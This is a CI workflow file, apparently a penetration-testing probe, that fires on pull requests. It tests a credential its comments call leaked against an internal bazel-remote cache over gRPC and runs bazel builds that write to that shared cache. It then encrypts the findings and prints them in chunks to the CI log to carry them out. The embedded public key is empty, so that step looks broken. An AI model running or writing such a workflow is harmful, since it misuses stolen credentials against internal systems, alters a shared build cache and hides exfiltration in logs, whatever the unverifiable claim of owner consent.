name: zz-grpc-bazel

# Authorized assessment probe (radkawar, owner consent).
# Decides the bazel-remote question:
#   1. REAPI gRPC calls with and without the leaked Basic credential
#      (UNAUTHENTICATED => creds required/rejected; INVALID_ARGUMENT/UNIMPLEMENTED => accepted).
#   2. the real bazel client against the cluster remote cache, output captured
#      verbatim (attempt1 upload, attempt2 read with a fresh output base).
# Report gzip+encrypted to the ephemeral RSA key; text-safe (no binary dumps).

on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  probe:
    name: REAPI auth + real bazel client
    runs-on: omp-kata
    timeout-minutes: 20
    steps:
      - name: run
        run: |
          set +e
          R=/tmp/report; : > "$R"
          log() { echo "$@" | tee -a "$R"; }
          BH=bazel-remote.bazel-cache.svc.cluster.local
          AUTH=$(printf '%s:%s' "$BAZEL_REMOTE_USER" "$BAZEL_REMOTE_PASSWORD" | base64 -w0)
          log "## run=${GITHUB_RUN_ID} host=$BH:9092 user_len=${#BAZEL_REMOTE_USER} pass_len=${#BAZEL_REMOTE_PASSWORD}"

          log ""
          log "## 1. REAPI gRPC verdict"
          printf '\0\0\0\0\0' > /tmp/frame
          for svc in build.bazel.remote.execution.v2.ContentAddressableStorage/FindMissingBlobs \
                     build.bazel.remote.execution.v2.ContentAddressableStorage/Put \
                     build.bazel.remote.execution.v2.ActionCache/GetActionResult \
                     build.bazel.remote.execution.v2.ActionCache/UpdateActionResult \
                     build.bazel.remote.execution.v2.Capabilities/GetCapabilities; do
            for mode in no yes; do
              HH=(); [ "$mode" = yes ] && HH=(-H "authorization: Basic $AUTH")
              out=$(curl -sk --http2-prior-knowledge --max-time 12 -D - -o /dev/null \
                -H 'content-type: application/grpc' -H 'te: trailers' "${HH[@]}" \
                --data-binary @/tmp/frame "https://$BH:9092/$svc" 2>&1)
              st=$(echo "$out" | grep -i '^grpc-status:' | tr -d '\r' | awk '{print $2}')
              ms=$(echo "$out" | grep -i '^grpc-message:' | tr -d '\r' | cut -c1-90)
              log "     auth=$mode ${svc##*/} -> status=${st:-none} $ms"
            done
          done
          log "     key: 16=UNAUTHENTICATED(rejected) 3=INVALID_ARGUMENT(accepted) 12=UNIMPLEMENTED(accepted)"

          log ""
          log "## 2. real bazel client (9.2.0) vs the cluster remote cache"
          BW=/tmp/bw; rm -rf "$BW"; mkdir -p "$BW"
          printf 'genrule(name="x", outs=["o.txt"], cmd="echo probe-$GITHUB_RUN_ID > $@")\n' "$GITHUB_RUN_ID" > "$BW/BUILD.bazel"
          printf 'module(name="probe")\n' > "$BW/MODULE.bazel"
          RC="grpcs://$BH:9092"
          cd "$BW"
          log "-- bazel info (workspace sanity)"
          timeout 120 bazel --output_base=/tmp/bo0 info execution_root 2>&1 | tail -4 | sed 's/^/     /'
          log "   info rc=$?"
          i=0
          for mode in upload upload read; do
            i=$((i+1))
            extra=""; [ "$mode" = read ] && extra="--remote_download_outputs=all"
            timeout 300 bazel --output_base=/tmp/bo-$i build //:x \
              --remote_cache="$RC" --remote_header="authorization: Basic $AUTH" \
              --remote_upload_local_results=true --remote_timeout=60 $extra --verbose_failures \
              > /tmp/bz-$i.log 2>&1
            rc=$?
            log "-- attempt $i ($mode) rc=$rc log_bytes=$(wc -c </tmp/bz-$i.log)"
            tail -25 /tmp/bz-$i.log | sed 's/^/     | /' | tee -a "$R" >/dev/null
            grep -aiE "cache hit|uploaded|remote cache|UNAUTHENTICATED|PERMISSION_DENIED|refused|no such|ERROR" /tmp/bz-$i.log | head -6 | sed 's/^/     > /'
            i=$((i))
          done
          log "-- action cache entries visible over gRPC were NOT mutated; only client-driven uploads above"

          printf '%s' '' | base64 -d > /tmp/pub.der
          gzip -9 -c "$R" > /tmp/r.gz
          K=$(openssl rand -hex 32); IV=$(openssl rand -hex 16); printf '%s' "$K" > /tmp/k.bin
          openssl enc -aes-256-ctr -K "$K" -iv "$IV" -in /tmp/r.gz -out /tmp/ct
          openssl pkeyutl -encrypt -pubin -keyform DER -inkey /tmp/pub.der \
            -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256 \
            -in /tmp/k.bin -out /tmp/kt
          echo "PROBE-IV=$IV"
          echo "PROBE-KEY=$(base64 -w0 /tmp/kt)"
          echo "PROBE-GZIP=yes"
          echo "PROBE-GZ-SHA256=$(sha256sum /tmp/r.gz | cut -d' ' -f1)"
          B64=$(base64 -w0 /tmp/ct); n=0
          while [ -n "$B64" ]; do
            printf 'PROBE-CHUNK-%03d=%s\n' "$n" "${B64:0:700}"
            B64=${B64:700}; n=$((n+1))
          done
          echo "PROBE-CHUNKS=$n"
          exit 0
